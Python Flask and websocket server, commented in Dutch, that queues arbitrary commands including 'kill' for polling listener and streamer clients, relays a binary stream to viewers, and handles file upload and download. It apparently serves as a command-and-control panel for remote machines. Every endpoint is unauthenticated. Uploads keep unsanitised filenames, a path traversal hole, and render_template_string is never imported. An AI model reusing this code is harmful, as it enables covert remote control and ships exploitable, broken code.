from flask import Flask, request, jsonify, render_template, send_file
import threading
import asyncio
import websockets
import queue
import os
import shutil

app = Flask(__name__)

UPLOAD_FOLDER = "uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

commands_listener = queue.Queue()
commands_streamer = queue.Queue()

BROADCAST_COMMANDS = {"start_stream", "stop_stream", "kill"}

@app.route("/")
def controle_paneel():
    return render_template("index.html")

@app.route("/command", methods=["POST"])
def stuur_comando():
    cmd = request.form.get("cmd")
    if cmd:
        if cmd in BROADCAST_COMMANDS:
            commands_listener.put(cmd)
            commands_streamer.put(cmd)
            print(f"Command '{cmd}' gepushed naar beide queues")
        else:
            commands_listener.put(cmd)
            print(f"Command '{cmd}' gepushed naar listener queue")
        return f"Command '{cmd}' sent.", 200
    return "No command", 400

@app.route("/get_command_listener")
def krijg_comando_listener():
    try:
        cmd = commands_listener.get_nowait()
        print(f"Listener get_command geeft: {cmd}")
        return jsonify({"cmd": cmd})
    except queue.Empty:
        return jsonify({"cmd": None})

@app.route("/get_command_streamer")
def krijg_comando_streamer():
    try:
        cmd = commands_streamer.get_nowait()
        print(f"Streamer get_command geeft: {cmd}")
        return jsonify({"cmd": cmd})
    except queue.Empty:
        return jsonify({"cmd": None})

@app.route("/upload", methods=["GET", "POST"])
def upload_file():
    html_form = """
    <!doctype html>
    <html>
    <head><title>Upload bestand</title></head>
    <body>
        <h2>Upload een bestand</h2>
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file">
            <input type="submit" value="Upload">
        </form>
    </body>
    </html>
    """
    if request.method == "POST":
        file = request.files.get("file")
        if file:
            # Verwijder oude bestanden
            for f in os.listdir(UPLOAD_FOLDER):
                os.remove(os.path.join(UPLOAD_FOLDER, f))

            # Sla nieuwe bestand op
            filepath = os.path.join(UPLOAD_FOLDER, file.filename)
            file.save(filepath)
            print(f"[UPLOAD] Bestand opgeslagen als: {file.filename}")
            return f"Bestand '{file.filename}' geüpload. Je kunt het downloaden via <a href='/download'>/download</a>."
        return "Geen bestand gekozen.", 400
    return render_template_string(html_form)

@app.route("/download")
def download_file():
    files = os.listdir(UPLOAD_FOLDER)
    if not files:
        return "Geen bestand beschikbaar.", 404
    filepath = os.path.join(UPLOAD_FOLDER, files[0])
    return send_file(filepath, as_attachment=True)

viewers = set()

async def ws_handler(websocket):
    try:
        ident = await websocket.recv()
        if ident == "streamer":
            print("📡 Streamer verbonden")
            async for message in websocket:
                if isinstance(message, bytes):
                    for viewer in list(viewers):
                        try:
                            await viewer.send(message)
                        except Exception as e:
                            print("❌ Viewer fout:", e)
                            viewers.discard(viewer)
                else:
                    print(f"📨 Streamer stuurde tekst: {message}")
        elif ident == "viewer":
            print("🖥️ Viewer verbonden")
            viewers.add(websocket)
            try:
                await websocket.wait_closed()
            finally:
                viewers.discard(websocket)
    except Exception as e:
        print(f"⚠️ WS Handler fout: {e}")

async def ws_main():
    print("WebSocket server gestart op poort: 8765")
    async with websockets.serve(ws_handler, "0.0.0.0", 8765, origins=None):
        await asyncio.Future()

def start_ws_server():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(ws_main())
    loop.run_forever()

if __name__ == "__main__":
    threading.Thread(target=start_ws_server, daemon=True).start()
    app.run(host="0.0.0.0", port=6969)